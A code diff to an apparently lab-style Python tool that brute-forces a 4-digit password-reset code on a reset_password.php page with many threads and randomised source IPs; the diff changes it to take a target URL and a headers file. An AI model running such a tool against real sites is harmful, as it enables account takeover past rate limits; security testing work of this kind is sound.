@@ -5,19 +5,31 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Parse command-line arguments
 parser = argparse.ArgumentParser(description="Brute-force 4-digit recovery code")
-parser.add_argument("-ip", "--ip", required=True, help="Target IP address")
-parser.add_argument("-p", "--port", required=True, help="Target port")
-parser.add_argument("-SID", "--session_id", required=True, help="PHPSESSID value")
+parser.add_argument("-u", "--url", required=True, help="Target Url")
+parser.add_argument("-H", "--headers", type=Path, help="Path to headers file (one 'Name: value' per line)")
 parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
 args = parser.parse_args()
 s_list = []
-URL = f"http://{args.ip}:{args.port}/reset_password.php"
+URL = args.url
+headers = args.headers
 
-HEADERS = {
-    "User-Agent": "Mozilla/5.0",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Cookie": f"PHPSESSID={args.session_id}"
-}
+def parse_headers_file(path: Path) -> dict:
+    """
+    Parse a headers file where each non-empty line is: Header-Name: value
+    Lines starting with # are treated as comments and ignored.
+    """
+    headers = {}
+    for lineno, raw in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
+        line = raw.strip()
+        if not line or line.startswith("#"):
+            continue
+        if ":" not in line:
+            raise ValueError(f"Invalid header line {lineno}: {raw!r} (expected 'Name: value')")
+        name, value = line.split(":", 1)
+        headers[name.strip()] = value.lstrip()  # preserve spaces after colon as part of value
+    return headers
+
+HEADERS = parse_headers_file(headers)
 
 def random_ip():
     return ".".join(str(random.randint(1, 255)) for _ in range(4))
